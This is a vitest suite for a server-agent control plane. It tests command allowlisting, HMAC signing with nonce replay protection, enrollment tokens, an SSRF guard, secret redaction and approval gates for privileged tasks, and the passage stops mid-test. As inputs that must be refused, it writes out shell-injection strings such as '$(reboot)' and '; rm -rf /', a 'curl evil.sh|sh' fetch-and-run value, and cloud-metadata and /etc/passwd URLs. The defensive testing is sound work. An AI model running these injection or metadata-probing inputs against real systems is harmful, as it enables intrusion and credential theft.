/**
 * Secure server agent — control plane (`src/lib/agents/*`) and the agent binary
 * that runs on a managed Linux host (`agent/alo-agent.mjs`).
 *
 * The properties under test are the ones that keep a host safe:
 *
 *   1. Nothing outside the allowlist can ever be executed — refused at dispatch
 *      time on the panel, and refused *again* on the host by the compiled-in
 *      copy, so a compromised control plane cannot widen what a server runs.
 *   2. Requests are HMAC-signed with a replay window and a nonce; a bad
 *      signature is rejected *and* audited.
 *   3. Enrollment tokens are single-use, expire, and never appear in storage in
 *      plaintext; the agent secret is returned exactly once.
 *   4. PRIVILEGED / DESTRUCTIVE tasks are gated behind a named human approval
 *      and are unclaimable until it is recorded.
 *   5. Everything that leaves the host is redacted, and nothing is reported as
 *      measured when it was not.
 *
 * Database-touching tests import their modules inside `beforeAll`, after
 * DATABASE_URL points at this file's own copy: vitest shares one module
 * registry across sequentially-run files, so a static import of `src/lib/db`
 * would silently reuse a client bound to another test file's database.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import http from "node:http";
import { execFileSync } from "node:child_process";
import {
  AGENT_ALLOWLIST,
  ALLOWED_AGENT_COMMANDS,
  DEFAULT_AGENT_CAPABILITIES,
  authorizeCommand,
  allowlistCatalogue,
  findAllowlistEntry,
} from "@/lib/agents/allowlist";
import * as host from "../agent/alo-agent.mjs";

let db: any;
let agents: typeof import("@/lib/agents/agent");

const root = path.join(os.tmpdir(), `alo-agent-test-${process.pid}`);
const dbPath = path.join(root, "agent.db");

/** A real user row: `audit_logs.actorUserId` has a FK to `users`. */
const ADMIN = { id: "", email: "", role: "ADMIN" };

beforeAll(async () => {
  await fs.mkdir(root, { recursive: true });
  await fs.copyFile(path.resolve("db/custom.db"), dbPath);
  execFileSync(process.execPath, ["scripts/apply-deploy-schema.mjs"], {
    cwd: process.cwd(),
    env: { ...process.env, DATABASE_URL: `file:${dbPath}` },
    stdio: "pipe",
  });

  process.env.DATABASE_URL = `file:${dbPath}`;
  process.env.APP_ENCRYPTION_KEY = "a".repeat(64);
  process.env.NEXTAUTH_SECRET = "t".repeat(64);
  process.env.JWT_SECRET = "j".repeat(64);

  db = (await import("@/lib/db")).db;
  agents = await import("@/lib/agents/agent");

  const admin = await db.user.findFirst({
    where: { role: { name: { in: ["SUPER_ADMIN", "ADMIN"] } } },
    select: { id: true, email: true, role: { select: { name: true } } },
  });
  if (!admin) throw new Error("test database has no ADMIN/SUPER_ADMIN user");
  ADMIN.id = admin.id;
  ADMIN.email = admin.email;
  ADMIN.role = admin.role.name;

  // Prove the agent tables really exist in this database before any test runs.
  for (const table of ["server_agents", "agent_tasks", "agent_enrollment_tokens", "agent_metrics"]) {
    const cols = await db.$queryRawUnsafe(`PRAGMA table_info("${table}")`);
    if (cols.length === 0) throw new Error(`test database is missing table ${table}`);
  }
});

afterAll(async () => {
  await db?.$disconnect().catch(() => {});
  await fs.rm(root, { recursive: true, force: true }).catch(() => {});
});

/** Create an enrolled, active agent directly (bypassing the token flow). */
async function makeAgent(opts: {
  name: string;
  capabilities?: string[];
  scopes?: string[];
  status?: string;
  serverId?: string | null;
} ) {
  const secret = agents.generateAgentSecret();
  const agent = await db.serverAgent.create({
    data: {
      serverId: opts.serverId ?? null,
      name: opts.name,
      agentKey: agents.generateAgentKey(),
      secretEnc: (await import("@/lib/encryption")).encryptSecret(secret),
      status: opts.status ?? "active",
      capabilities: JSON.stringify(opts.capabilities ?? DEFAULT_AGENT_CAPABILITIES),
      scopes: JSON.stringify(opts.scopes ?? ["server:read", "server:execute"]),
      enrolledAt: new Date(),
    },
  });
  return { agent, secret };
}

// ── The trust boundary: the allowlist ────────────────────────────────────────

describe("agent command allowlist", () => {
  it("pins an executable, a risk level, a timeout and required scopes for every command", () => {
    expect(AGENT_ALLOWLIST.length).toBeGreaterThanOrEqual(9);
    for (const entry of AGENT_ALLOWLIST) {
      expect(entry.executable.length).toBeGreaterThan(0);
      expect(["READ_ONLY", "REVERSIBLE", "PRIVILEGED", "DESTRUCTIVE"]).toContain(entry.risk);
      expect(entry.timeoutMs).toBeGreaterThan(0);
      expect(entry.timeoutMs).toBeLessThanOrEqual(30 * 60_000);
      expect(entry.scopes.length).toBeGreaterThan(0);
      expect(typeof entry.requiresSudo).toBe("boolean");
      expect(entry.command).toMatch(/^[a-z]+\.[a-z-]+$/);
    }
  });

  it("grants a newly enrolled agent read-only capabilities and nothing privileged", () => {
    expect(DEFAULT_AGENT_CAPABILITIES.length).toBeGreaterThan(0);
    for (const command of DEFAULT_AGENT_CAPABILITIES) {
      expect(findAllowlistEntry(command)?.risk).toBe("READ_ONLY");
    }
    expect(DEFAULT_AGENT_CAPABILITIES).not.toContain("service.restart");
    expect(DEFAULT_AGENT_CAPABILITIES).not.toContain("backup.database");
  });

  it("gates every mutating command behind PRIVILEGED or DESTRUCTIVE", () => {
    expect(findAllowlistEntry("service.restart")?.risk).toBe("PRIVILEGED");
    expect(findAllowlistEntry("backup.database")?.risk).not.toBe("READ_ONLY");
    expect(findAllowlistEntry("service.status")?.risk).toBe("READ_ONLY");
    expect(findAllowlistEntry("metrics.collect")?.risk).toBe("READ_ONLY");
  });

  it("refuses a command that is not in the allowlist, with a reason safe to display", () => {
    const decision = authorizeCommand({
      command: "shell.exec",
      args: { cmd: "rm -rf /" },
      agentCapabilities: [...DEFAULT_AGENT_CAPABILITIES, "shell.exec"],
      actorScopes: ["server:execute"],
    });
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain("not in the platform allowlist");
    expect(decision.reason).not.toContain("rm -rf");
    expect(ALLOWED_AGENT_COMMANDS.has("shell.exec")).toBe(false);
  });

  it("refuses a command the agent has not been granted, even when the actor holds the scope", () => {
    const decision = authorizeCommand({
      command: "service.restart",
      args: { unit: "alo-hosting-panel.service" },
      agentCapabilities: DEFAULT_AGENT_CAPABILITIES, // read-only only
      actorScopes: ["server:execute"],
    });
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain("has not been granted");
  });

  it("refuses when the actor is missing a required scope", () => {
    const entry = findAllowlistEntry("service.restart")!;
    const decision = authorizeCommand({
      command: "service.restart",
      args: { unit: "alo-hosting-panel.service" },
      agentCapabilities: [...DEFAULT_AGENT_CAPABILITIES, "service.restart"],
      actorScopes: [],
    });
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain("missing required scope");
    expect(entry.scopes.length).toBeGreaterThan(0);
  });

  it("rejects shell metacharacters and invalid arguments before anything is built", () => {
    const granted = [...DEFAULT_AGENT_CAPABILITIES, "service.restart"];
    for (const unit of ["alo.service; rm -rf /", "$(reboot)", "a|b", "svc`id`", "x\ny"]) {
      const decision = authorizeCommand({ command: "service.restart", args: { unit }, agentCapabilities: granted, actorScopes: ["server:execute"] });
      expect(decision.allowed, `expected "${unit}" to be refused`).toBe(false);
    }
    const missing = authorizeCommand({ command: "service.restart", args: {}, agentCapabilities: granted, actorScopes: ["server:execute"] });
    expect(missing.allowed).toBe(false);
    expect(missing.reason).toContain("failed validation");
  });

  it("authorizes a legitimate read-only request and builds argv from the entry, never from the caller", () => {
    const decision = authorizeCommand({
      command: "service.status",
      args: { unit: "alo-hosting-panel.service", injected: "ignored-but-harmless" },
      agentCapabilities: DEFAULT_AGENT_CAPABILITIES,
      actorScopes: ["server:read"],
    });
    expect(decision.allowed).toBe(true);
    const argv = decision.entry!.argv({ unit: "alo-hosting-panel.service" });
    expect(argv).toEqual(["is-active", "alo-hosting-panel.service"]);
    expect(decision.entry!.executable).toBe("systemctl");
  });

  it("exposes a catalogue with no secrets and no argv builders for the dashboard", () => {
    const catalogue = allowlistCatalogue();
    expect(catalogue.length).toBe(AGENT_ALLOWLIST.length);
    for (const row of catalogue) {
      expect(Object.keys(row).sort()).toEqual(["command", "description", "label", "requiresSudo", "risk", "scopes", "timeoutMs"]);
      expect(JSON.stringify(row)).not.toContain("argv");
    }
  });
});

// ── The host side: agent/alo-agent.mjs ───────────────────────────────────────

describe("agent binary (agent/alo-agent.mjs)", () => {
  it("ships a compiled-in allowlist that matches the panel's command set", () => {
    expect(Object.keys(host.AGENT_ALLOWLIST).sort()).toEqual([...ALLOWED_AGENT_COMMANDS].sort());
  });

  it("agrees with the panel on the risk level of every command", () => {
    for (const entry of AGENT_ALLOWLIST) {
      expect(host.AGENT_ALLOWLIST[entry.command]?.risk, `${entry.command} risk mismatch`).toBe(entry.risk);
    }
    expect(host.AGENT_ALLOWLIST["service.restart"].sudo).toBe(true);
  });

  it("refuses to probe anything that is not loopback or RFC1918 (SSRF guard)", () => {
    for (const allowed of [
      "http://127.0.0.1:3000/health",
      "http://localhost:3000/health",
      "http://10.0.0.5/health",
      "http://192.168.1.20:8080/",
      "http://172.16.0.9/",
      "http://172.31.255.254/",
      "http://100.64.0.1/",
    ]) {
      expect(host.isPrivateTarget(allowed), `expected ${allowed} to be allowed`).toBe(true);
    }
    for (const refused of [
      // Cloud metadata and link-local must never be reachable from an agent,
      // even though they are not publicly routable (SSRF/IMDS credential theft).
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.1.1/",
      "http://100.100.100.200/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://[fd00:ec2::254]/latest/meta-data/",
      "http://0.0.0.0:3000/",
      "http://8.8.8.8/",
      "https://hosting.alolabs.net/",
      "http://172.32.0.1/",
      "http://11.0.0.1/",
      "http://evil.example.com/", // a hostname could resolve anywhere
      "file:///etc/passwd",
      "ftp://10.0.0.1/",
      "not a url",
    ]) {
      expect(host.isPrivateTarget(refused), `expected ${refused} to be refused`).toBe(false);
    }
    expect(host.isPrivateTarget("http://172.15.0.1/")).toBe(false);
    expect(host.isPrivateTarget("http://172.32.0.1/")).toBe(false);
    expect(host.isPrivateTarget("http://999.1.1.1/")).toBe(false);
  });

  it("signs and verifies exactly the way the panel does, and rejects tampering", () => {
    const secret = "alo_ags_test-secret";
    const body = JSON.stringify({ version: "1.0.0" });
    const timestamp = String(Date.now());
    const nonce = "abcdef0123456789";
    const signature = host.sign(secret, body, timestamp, nonce);
    expect(host.verify(secret, body, timestamp, nonce, signature)).toBe(true);
    // The panel's verifier must accept the agent's signature byte-for-byte.
    expect(agents.verifySignature({ secret, body, timestamp, nonce, signature }).valid).toBe(true);
    // Flip the last hex digit deterministically: appending "0" would be a no-op
    // whenever the signature already ends in "0", which made this assertion
    // depend on chance (and fail in CI roughly one run in sixteen).
    const tampered = signature.slice(0, -1) + (signature.endsWith("0") ? "1" : "0");
    expect(tampered).not.toBe(signature);
    expect(host.verify(secret, body, timestamp, nonce, tampered)).toBe(false);
    expect(agents.verifySignature({ secret, body, timestamp, nonce, signature: tampered }).valid).toBe(false);
    expect(host.verify(secret, `{"version":"9.9.9"}`, timestamp, nonce, signature)).toBe(false);
    expect(host.verify("wrong-secret", body, timestamp, nonce, signature)).toBe(false);
  });

  it("redacts credentials from anything that leaves the host", () => {
    const dirty = [
      "token ghp_0123456789abcdefghijklmnopqrstuv",
      "github_pat_0123456789abcdefghijklmnopqrstuv",
      "aws key AKIAIOSFODNN7EXAMPLE",
      "DATABASE_URL=mysql://root:sup3rs3cret@127.0.0.1:3306/alo",
      "password=hunter2secret",
      "-----BEGIN RSA PRIVATE KEY-----\nMIIEsecretmaterial\n-----END RSA PRIVATE KEY-----",
    ].join("\n");
    const clean = host.sanitize(dirty, ["sup3rs3cret", "hunter2secret"]);
    expect(clean).not.toContain("ghp_0123456789");
    expect(clean).not.toContain("github_pat_0123456789");
    expect(clean).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(clean).not.toContain("sup3rs3cret");
    expect(clean).not.toContain("hunter2secret");
    expect(clean).not.toContain("MIIEsecretmaterial");
    expect(clean).toContain("[REDACTED");
    expect(host.sanitize("plain line with no secrets")).toBe("plain line with no secrets");
    expect(host.sanitize("")).toBe("");
  });

  it("refuses an unknown command without executing anything", async () => {
    const res = await host.executeTask({ command: "shell.exec", args: JSON.stringify({ cmd: "reboot" }) });
    expect(res.status).toBe("REFUSED");
    expect(res.refuseReason).toContain("not in this agent's compiled-in allowlist");
    expect(res.exitCode).toBeNull();
  });

  it("refuses malformed arguments and arguments that fail the host-side schema", async () => {
    expect((await host.executeTask({ command: "service.status", args: "{not json" })).refuseReason).toContain("not valid JSON");
    expect((await host.executeTask({ command: "service.status", args: JSON.stringify(["a"]) })).refuseReason).toContain("must be a JSON object");
    for (const unit of ["alo.service; rm -rf /", "$(reboot)", "../etc/passwd", "a|b"]) {
      const res = await host.executeTask({ command: "service.status", args: JSON.stringify({ unit }) });
      expect(res.status, `expected "${unit}" refused`).toBe("REFUSED");
    }
    expect((await host.executeTask({ command: "disk.usage", args: JSON.stringify({ path: "/tmp; curl evil.sh|sh" }) })).status).toBe("REFUSED");
  });

  it("refuses db.replication-status rather than guessing, and says what is missing", async () => {
    const res = await host.executeTask({ command: "db.replication-status", args: "{}" });
    expect(res.status).toBe("REFUSED");
    expect(res.refuseReason).toContain("needs database credentials on this host");
    expect(res.refuseReason).toContain("will not read credentials from the panel");
  });

  it("probes a real loopback endpoint and reports the observed status and commit", async () => {
    const sha = "a".repeat(40);
    const server = http.createServer((_req, res) => {
      res.writeHead(200, { "content-type": "text/plain" });
      res.end(`ok ${sha}`);
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = (server.address() as { port: number }).port;
    try {
      const res = await host.executeTask({ command: "health.probe", args: JSON.stringify({ url: `http://127.0.0.1:${port}/health` }) });
      expect(res.status).toBe("SUCCEEDED");
      expect(res.exitCode).toBe(0);
      expect(res.result.httpStatus).toBe(200);
      expect(res.result.commit).toBe(sha);
      expect(typeof res.result.latencyMs).toBe("number");
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });

  it("refuses a health probe aimed at a public address even though the command is allowlisted", async () => {
    // Refused twice over: first by the entry's own validate(), and again by the
    // explicit guard inside executeTask. Either message is a refusal — what must
    // never happen is a request leaving the host for a public address.
    const res = await host.executeTask({ command: "health.probe", args: JSON.stringify({ url: "https://hosting.alolabs.net/" }) });
    expect(res.status).toBe("REFUSED");
    expect(res.exitCode).toBeNull();
    expect(host.AGENT_ALLOWLIST["health.probe"].validate({ url: "https://hosting.alolabs.net/" })).toBe(false);
    expect(host.AGENT_ALLOWLIST["health.probe"].validate({ url: "http://127.0.0.1:3000/" })).toBe(true);
  });

  it("reports a real command failure as FAILED with the exit code, never as success", async () => {
    // /nonexistent-alo-path cannot exist, so `df -P` must fail honestly.
    const res = await host.executeTask({ command: "disk.usage", args: JSON.stringify({ path: "/nonexistent-alo-path" }) });
    expect(res.status).toBe("FAILED");
    expect(res.exitCode).not.toBe(0);
    expect(res.result.argv[0]).toBe("df");
  });

  it("collects real metrics from the host it runs on", async () => {
    const res = await host.executeTask({ command: "metrics.collect", args: "{}" });
    expect(res.status).toBe("SUCCEEDED");
    expect(res.result).toBeTypeOf("object");
    // Keys must exist; values may legitimately be null where /proc is absent,
    // because "unknown" is an allowed answer and a fabricated 0 is not.
    for (const key of ["cpuPercent", "memoryUsedMb", "memoryTotalMb", "diskUsedGb", "diskTotalGb", "uptimeSeconds"]) {
      expect(res.result).toHaveProperty(key);
    }
  });
});

// ── Enrollment, identity and the replay window ───────────────────────────────

describe("agent enrollment and request authentication", () => {
  it("issues a single-use enrollment token, stores only its hash, and expires it", async () => {
    const issued = await agents.createEnrollmentToken({
      agentName: "office-a",
      scopes: ["server:read", "server:execute", "not-a-real-scope"],
      capabilities: ["metrics.collect", "service.restart", "shell.exec"],
      actor: ADMIN,
    });
    expect(issued.token).toMatch(/^alo_enroll_/);
    expect(issued.prefix).toBe(issued.token.slice(0, 16));
    // Unknown scopes and capabilities are dropped, not stored.
    expect(issued.scopes).not.toContain("not-a-real-scope");
    expect(issued.capabilities).not.toContain("shell.exec");
    expect(issued.capabilities).toContain("service.restart");

    const row = await db.agentEnrollmentToken.findUnique({ where: { id: issued.tokenId } });
    expect(row.tokenHash).toBe(agents.hashToken(issued.token));
    expect(JSON.stringify(row)).not.toContain(issued.token); // plaintext never persisted
    expect(row.expiresAt.getTime() - Date.now()).toBeLessThanOrEqual(agents.ENROLLMENT_TTL_MS);

    const enrolled = await agents.enrollAgent({ token: issued.token, version: "1.0.0", ip: "10.0.0.5" });
    expect(enrolled.ok).toBe(true);
    if (!enrolled.ok) return;
    expect(enrolled.secret).toMatch(/^alo_ags_/);
    expect(enrolled.agentKey).toMatch(/^alo_agt_/);
    expect(enrolled.capabilities).toContain("service.restart");
    expect(enrolled.heartbeatIntervalMs).toBeGreaterThan(0);

    // Replay of the same token is refused.
    const replay = await agents.enrollAgent({ token: issued.token });
    expect(replay.ok).toBe(false);
    if (replay.ok) return;
    expect(replay.reason).toContain("already been used");
    expect(await db.serverAgent.count({ where: { name: "office-a" } })).toBe(1);

    // The secret is stored encrypted, not in plaintext.
    const stored = await db.serverAgent.findUnique({ where: { id: enrolled.agentId } });
    expect(stored.secretEnc).not.toContain(enrolled.secret);
    expect((await import("@/lib/encryption")).decryptSecret(stored.secretEnc)).toBe(enrolled.secret);
  });

  it("refuses an unknown token and an expired token", async () => {
    const unknown = await agents.enrollAgent({ token: "alo_enroll_does-not-exist" });
    expect(unknown.ok).toBe(false);
    if (unknown.ok) return;
    expect(unknown.reason).toContain("Unknown enrollment token");

    const issued = await agents.createEnrollmentToken({ agentName: "expired-host" });
    await db.agentEnrollmentToken.update({ where: { id: issued.tokenId }, data: { expiresAt: new Date(Date.now() - 1000) } });
    const expired = await agents.enrollAgent({ token: issued.token });
    expect(expired.ok).toBe(false);
    if (expired.ok) return;
    expect(expired.reason).toContain("expired");
    expect(await db.serverAgent.count({ where: { name: "expired-host" } })).toBe(0);
  });

  it("accepts a correctly signed request and rejects a tampered or stale one", async () => {
    const { agent, secret } = await makeAgent({ name: "auth-host" });
    const body = JSON.stringify({ version: "1.0.0" });
    const timestamp = String(Date.now());
    const nonce = "0123456789abcdef";

    const ok = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: agents.signPayload(secret, body, timestamp, nonce),
      timestamp,
      nonce,
      body,
      ip: "10.0.0.9",
    });
    expect(ok.ok).toBe(true);

    const tampered = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: agents.signPayload(secret, body, timestamp, nonce),
      timestamp,
      nonce,
      body: JSON.stringify({ version: "9.9.9" }),
    });
    expect(tampered.ok).toBe(false);
    if (tampered.ok) return;
    expect(tampered.reason).toContain("signature mismatch");

    const audit = await db.auditLog.findFirst({ where: { action: "AGENT_AUTH_FAILURE", resourceId: agent.id }, orderBy: { timestamp: "desc" } });
    expect(audit).not.toBeNull();
    expect(audit.errorCode).toBe("SIGNATURE_INVALID");

    const stale = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: agents.signPayload(secret, body, String(Date.now() - 10 * 60_000), nonce),
      timestamp: String(Date.now() - 10 * 60_000),
      nonce,
      body,
    });
    expect(stale.ok).toBe(false);
    if (stale.ok) return;
    expect(stale.reason).toContain("replay window");

    const shortNonce = agents.verifySignature({ secret, body, timestamp, nonce: "abc", signature: agents.signPayload(secret, body, timestamp, "abc") });
    expect(shortNonce.valid).toBe(false);
    expect(shortNonce.reason).toContain("nonce");

    const unknownKey = await agents.authenticateAgentRequest({ agentKey: "alo_agt_nope", signature: "x", timestamp, nonce, body });
    expect(unknownKey.ok).toBe(false);
  });

  it("stops accepting requests the moment an agent is revoked, and rotates secrets", async () => {
    const { agent, secret } = await makeAgent({ name: "rotate-then-revoke" });
    const body = "{}";
    const timestamp = String(Date.now());
    const nonce = "nonce-rotate-1";

    const rotated = await agents.rotateAgentSecret(agent.id, ADMIN);
    expect(rotated.ok).toBe(true);
    if (!rotated.ok) return;
    const withOld = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: agents.signPayload(secret, body, timestamp, nonce),
      timestamp,
      nonce,
      body,
    });
    expect(withOld.ok).toBe(false); // the old secret stops working immediately
    const withNew = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: agents.signPayload(rotated.secret, body, timestamp, nonce),
      timestamp,
      nonce,
      body,
    });
    expect(withNew.ok).toBe(true);

    expect((await agents.revokeAgent(agent.id, ADMIN)).ok).toBe(true);
    expect((await agents.revokeAgent(agent.id, ADMIN)).ok).toBe(false); // idempotent, reported honestly
    const afterRevoke = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: agents.signPayload(rotated.secret, body, timestamp, nonce),
      timestamp,
      nonce,
      body,
    });
    expect(afterRevoke.ok).toBe(false);
    if (afterRevoke.ok) return;
    expect(afterRevoke.reason).toContain("revoked");
    expect((await agents.dispatchTask({ agentId: agent.id, command: "metrics.collect" })).status).toBe("REFUSED");
    expect(agents.agentOnline({ lastHeartbeat: new Date(), status: "revoked" })).toBe(false);
  });
});

// ── Replay prevention ────────────────────────────────────────────────────────

describe("agent request replay prevention", () => {
  it("accepts a signed request once and rejects the identical request again inside the window", async () => {
    const { agent, secret } = await makeAgent({ name: "replay-host" });
    const body = JSON.stringify({ version: "1.0.0" });
    const timestamp = String(Date.now());
    const nonce = "replay-nonce-0001";
    const signature = agents.signPayload(secret, body, timestamp, nonce);

    const first = await agents.authenticateAgentRequest({ agentKey: agent.agentKey, signature, timestamp, nonce, body });
    expect(first.ok).toBe(true);

    // Same bytes, still inside the ±5 minute timestamp window: a replay.
    const second = await agents.authenticateAgentRequest({ agentKey: agent.agentKey, signature, timestamp, nonce, body });
    expect(second.ok).toBe(false);
    if (second.ok) return;
    expect(second.reason).toContain("nonce replay");

    const audit = await db.auditLog.findFirst({
      where: { action: "AGENT_AUTH_FAILURE", resourceId: agent.id, errorCode: "NONCE_REPLAY" },
      orderBy: { timestamp: "desc" },
    });
    expect(audit).not.toBeNull();
    expect(audit.result).toBe("FAILURE");
  });

  it("rejects concurrent replays of the same request: exactly one wins", async () => {
    const { agent, secret } = await makeAgent({ name: "replay-race-host" });
    const body = "{}";
    const timestamp = String(Date.now());
    const nonce = "replay-race-0001";
    const signature = agents.signPayload(secret, body, timestamp, nonce);

    const attempts = await Promise.all(
      Array.from({ length: 6 }, () =>
        agents.authenticateAgentRequest({ agentKey: agent.agentKey, signature, timestamp, nonce, body }),
      ),
    );
    const accepted = attempts.filter((a) => a.ok).length;
    expect(accepted).toBe(1);
    expect(await db.agentNonce.count({ where: { agentId: agent.id, nonce } })).toBe(1);
  });

  it("scopes nonces per agent, so two hosts can use the same nonce value", async () => {
    const a = await makeAgent({ name: "nonce-scope-a" });
    const b = await makeAgent({ name: "nonce-scope-b" });
    const body = "{}";
    const timestamp = String(Date.now());
    const nonce = "shared-nonce-value";

    expect(
      (await agents.authenticateAgentRequest({
        agentKey: a.agent.agentKey,
        signature: agents.signPayload(a.secret, body, timestamp, nonce),
        timestamp,
        nonce,
        body,
      })).ok,
    ).toBe(true);
    expect(
      (await agents.authenticateAgentRequest({
        agentKey: b.agent.agentKey,
        signature: agents.signPayload(b.secret, body, timestamp, nonce),
        timestamp,
        nonce,
        body,
      })).ok,
    ).toBe(true);
  });

  it("accepts a legitimate retry that signs a fresh nonce", async () => {
    const { agent, secret } = await makeAgent({ name: "retry-host" });
    const body = JSON.stringify({ metrics: { cpuPercent: 4 } });
    for (const nonce of ["retry-nonce-1", "retry-nonce-2", "retry-nonce-3"]) {
      const timestamp = String(Date.now());
      const res = await agents.authenticateAgentRequest({
        agentKey: agent.agentKey,
        signature: agents.signPayload(secret, body, timestamp, nonce),
        timestamp,
        nonce,
        body,
      });
      expect(res.ok, nonce).toBe(true);
    }
  });

  it("does not consume a nonce for a request whose signature is invalid", async () => {
    const { agent } = await makeAgent({ name: "bad-sig-nonce-host" });
    const nonce = "never-consumed-1";
    const res = await agents.authenticateAgentRequest({
      agentKey: agent.agentKey,
      signature: "deadbeef".repeat(8),
      timestamp: String(Date.now()),
      nonce,
      body: "{}",
    });
    expect(res.ok).toBe(false);
    // An attacker who cannot sign must not be able to burn a victim's nonces.
    expect(await db.agentNonce.count({ where: { agentId: agent.id, nonce } })).toBe(0);
  });

  it("cannot be used to forge a task result by replaying a captured report", async () => {
    const { agent, secret } = await makeAgent({ name: "result-replay-host" });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "metrics.collect" });
    const claimed = await agents.claimTask(agent.id);
    expect(claimed?.id).toBe(task.id);

    const body = JSON.stringify({ taskId: task.id, status: "SUCCEEDED", exitCode: 0, result: { fabricated: true } });
    const timestamp = String(Date.now());
    const nonce = "result-nonce-0001";
    const signature = agents.signPayload(secret, body, timestamp, nonce);

    const first = await agents.authenticateAgentRequest({ agentKey: agent.agentKey, signature, timestamp, nonce, body });
    expect(first.ok).toBe(true);
    if (!first.ok) return;
    await agents.recordTaskResult(task.id, { status: "FAILED", exitCode: 1, error: "the honest result" });

    // The replay authenticates to nothing: the request is rejected before any
    // handler can act on it, so the recorded failure stands.
    const replay = await agents.authenticateAgentRequest({ agentKey: agent.agentKey, signature, timestamp, nonce, body });
    expect(replay.ok).toBe(false);
    const stored = await db.agentTask.findUnique({ where: { id: task.id } });
    expect(stored.status).toBe("FAILED");
    expect(stored.error).toContain("honest result");
  });

  it("prunes nonces whose signature window has passed, so the table stays bounded", async () => {
    const { agent } = await makeAgent({ name: "prune-host" });
    await db.agentNonce.createMany({
      data: [
        { agentId: agent.id, nonce: "ancient-1", expiresAt: new Date(Date.now() - 10 * 60_000) },
        { agentId: agent.id, nonce: "ancient-2", expiresAt: new Date(Date.now() - 9 * 60_000) },
      ],
    });
    expect(await db.agentNonce.count({ where: { agentId: agent.id } })).toBe(2);

    expect(await agents.consumeRequestNonce(agent.id, "fresh-nonce")).toBe(true);
    expect(await db.agentNonce.count({ where: { agentId: agent.id, nonce: { startsWith: "ancient" } } })).toBe(0);
    // An expired nonce is no longer protected by the table, and that is correct:
    // the timestamp check now rejects the request on its own.
    const stale = agents.verifySignature({
      secret: "s",
      body: "{}",
      timestamp: String(Date.now() - 10 * 60_000),
      nonce: "ancient-1",
      signature: agents.signPayload("s", "{}", String(Date.now() - 10 * 60_000), "ancient-1"),
    });
    expect(stale.valid).toBe(false);
    expect(stale.reason).toContain("replay window");
  });
});

// ── Dispatch, approval gating and results ────────────────────────────────────

describe("agent task dispatch and the human approval gate", () => {
  it("refuses an unauthorized command at dispatch time and records the refusal", async () => {
    const { agent } = await makeAgent({ name: "dispatch-host" });
    const res = await agents.dispatchTask({ agentId: agent.id, command: "shell.exec", args: { cmd: "shutdown -h now" }, actorEmail: ADMIN.email });
    expect(res.status).toBe("REFUSED");
    expect(res.refuseReason).toContain("REFUSED_BY_ALLOWLIST");

    const stored = await db.agentTask.findUnique({ where: { id: res.id } });
    expect(stored.status).toBe("REFUSED");
    expect(stored.finishedAt).not.toBeNull();

    const audit = await db.auditLog.findFirst({ where: { action: "AGENT_TASK_REFUSED", resourceId: res.id } });
    expect(audit).not.toBeNull();
    expect(audit.errorCode).toBe("REFUSED_BY_ALLOWLIST");
  });

  it("refuses a command the agent was not granted, and a missing agent", async () => {
    const { agent } = await makeAgent({ name: "readonly-host", capabilities: ["metrics.collect"] });
    const gated = await agents.dispatchTask({ agentId: agent.id, command: "service.restart", args: { unit: "alo.service" } });
    expect(gated.status).toBe("REFUSED");
    expect(gated.refuseReason).toContain("has not been granted");

    const missing = await agents.dispatchTask({ agentId: "no-such-agent", command: "metrics.collect" });
    expect(missing.status).toBe("REFUSED");
    expect(missing.refuseReason).toContain("AGENT_NOT_FOUND");
  });

  it("keeps a PRIVILEGED task unclaimable until a named human approves it", async () => {
    const { agent } = await makeAgent({ name: "gated-host", capabilities: [...DEFAULT_AGENT_CAPABILITIES, "service.restart"] });
    const task = await agents.dispatchTask({
      agentId: agent.id,
      command: "service.restart",
      args: { unit: "alo-hosting-panel.service" },
      actorEmail: ADMIN.email,
    });
    expect(task.status).toBe("PENDING");
    expect(task.requiresApproval).toBe(true);
    expect(task.command).toBe("service.restart");

    const gated = await db.auditLog.findFirst({ where: { action: "AGENT_TASK_GATED", resourceId: task.id } });
    expect(gated).not.toBeNull();
    expect(gated.result).toBe("WAITING_APPROVAL");

    // The agent polls — and gets nothing, because no human has decided yet.
    expect(await agents.claimTask(agent.id)).toBeNull();

    const approved = await agents.approveAgentTask(task.id, ADMIN, "maintenance window agreed");
    expect(approved.ok).toBe(true);

    const row = await db.agentTask.findUnique({ where: { id: task.id } });
    expect(row.approvedBy).toBe(ADMIN.email);
    const approvalAudit = await db.auditLog.findFirst({ where: { action: "AGENT_TASK_APPROVED", resourceId: task.id } });
    expect(approvalAudit).not.toBeNull();
    expect(approvalAudit.actorUserId).toBe(ADMIN.id);

    const claimed = await agents.claimTask(agent.id);
    expect(claimed?.id).toBe(task.id);
    expect(claimed?.status).toBe("ASSIGNED");
    expect(claimed?.dispatchedAt).not.toBeNull();
    // A second poll must not hand the same task out again.
    expect(await agents.claimTask(agent.id)).toBeNull();

    // Approving twice is a conflict, not a silent success.
    const again = await agents.approveAgentTask(task.id, ADMIN);
    expect(again.ok).toBe(false);
  });

  it("records a refusal so the task can never be dispatched, and audits it", async () => {
    const { agent } = await makeAgent({ name: "refuse-host", capabilities: [...DEFAULT_AGENT_CAPABILITIES, "service.restart"] });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "service.restart", args: { unit: "alo.service" } });
    expect(task.requiresApproval).toBe(true);

    const rejected = await agents.rejectAgentTask(task.id, ADMIN, "not during business hours");
    expect(rejected.ok).toBe(true);
    const row = await db.agentTask.findUnique({ where: { id: task.id } });
    expect(row.status).toBe("REFUSED");
    expect(row.refuseReason).toContain("APPROVAL_REJECTED");
    expect(row.refuseReason).toContain("not during business hours");
